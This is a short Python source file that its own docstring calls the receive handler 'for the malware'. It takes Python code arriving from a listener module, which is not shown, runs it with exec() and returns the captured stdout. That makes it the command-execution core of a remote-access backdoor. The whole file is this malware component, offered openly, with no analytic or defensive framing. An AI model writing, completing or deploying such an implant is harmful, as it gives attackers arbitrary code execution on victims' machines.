import sys

from listener import listen_for_commands
import os


def handle_receive(command: str) -> bytes:
    """
    The classic on_recv function for the malware. Executes provided command and returns the output.
    @param command Python code to execute.
    @return output of command through the 'out' file. Exception string if thrown.
    """
    exec(wrap(command))
    with open('out.txt', 'r') as f:
        a = f.readlines()
    os.remove('out.txt')

    return "\n".join(a).encode('utf-8')


def wrap(command: str) -> str:
    ans = "f=open ('out.txt','w')\nsys.stdout = f\n"
    ans += command + "\n"
    ans += "f.close()"
    return ans


def main():
    listen_for_commands(handle_receive)


if __name__ == '__main__':
    with open("try.py", "r") as f:
        b = handle_receive(f.read())
    print(str(b))
